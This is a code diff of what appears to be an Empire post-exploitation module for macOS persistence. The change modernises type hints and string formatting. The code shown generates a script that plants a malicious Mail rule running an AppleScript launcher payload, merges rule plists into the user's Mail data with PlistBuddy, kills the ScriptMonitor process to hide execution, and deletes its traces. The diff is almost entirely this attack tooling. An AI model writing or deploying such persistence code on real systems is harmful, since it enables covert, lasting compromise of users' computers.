@@ -1,20 +1,20 @@
 from random import choice
 from string import ascii_uppercase
 from time import time
-from typing import Dict, Optional, Tuple
 
+from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
 
 
 class Module:
     @staticmethod
     def generate(
-        main_menu,
+        main_menu: MainMenu,
         module: EmpireModule,
-        params: Dict,
+        params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
-    ) -> Tuple[Optional[str], Optional[str]]:
+    ) -> tuple[str | None, str | None]:
         rule_name = params["RuleName"]
         trigger = params["Trigger"]
         listener_name = params["Listener"]
@@ -128,15 +128,15 @@ class Module:
         </plist>
             """
         )
-        script = """
+        script = f"""
 import os
 home =  os.getenv("HOME")
-AppleScript = '{}'
-SyncedRules = '{}'
-RulesActiveState = '{}'
-plist = \"\"\"{}\"\"\"
-plist2 = \"\"\"{}\"\"\"
-payload = \'\'\'{}\'\'\'
+AppleScript = '{apple_script}'
+SyncedRules = '{synced_rules}'
+RulesActiveState = '{rules_active_state}'
+plist = \"\"\"{plist}\"\"\"
+plist2 = \"\"\"{plist2}\"\"\"
+payload = \'\'\'{launcher}\'\'\'
 payload = payload.replace('&\"', '& ')
 payload += "kill `ps -ax | grep ScriptMonitor |grep -v grep |  awk \'{{print($1)}}\'`"
 payload += '\"'
@@ -185,13 +185,6 @@ else:
 os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/" + version + "/MailData/RulesActiveState.plist")
 os.system("rm " + SyncedRules)
 os.system("rm " + RulesActiveState)
-        """.format(
-            apple_script,
-            synced_rules,
-            rules_active_state,
-            plist,
-            plist2,
-            launcher,
-        )
+        """
 
         return script
